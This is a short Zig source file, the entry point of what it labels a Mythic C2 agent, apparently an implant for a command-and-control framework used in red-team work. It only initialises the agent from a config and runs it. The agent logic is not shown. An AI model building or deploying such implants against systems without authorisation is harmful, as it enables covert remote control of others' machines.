const std = @import("std");
const agent = @import("agent.zig");
const types = @import("types.zig");
const config = @import("config.zig");

const print = std.debug.print;
const MythicAgent = agent.MythicAgent;
const AgentConfig = types.AgentConfig;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();
    
    const agent_config = config.agentConfig;
    
    var mythic_agent = try MythicAgent.init(allocator, agent_config);
    defer mythic_agent.deinit();
    
    print("[+] Starting Mythic C2 Agent\n", .{});
    print("[+] Zig version: 0.14.0\n", .{});
    
    try mythic_agent.run();
}

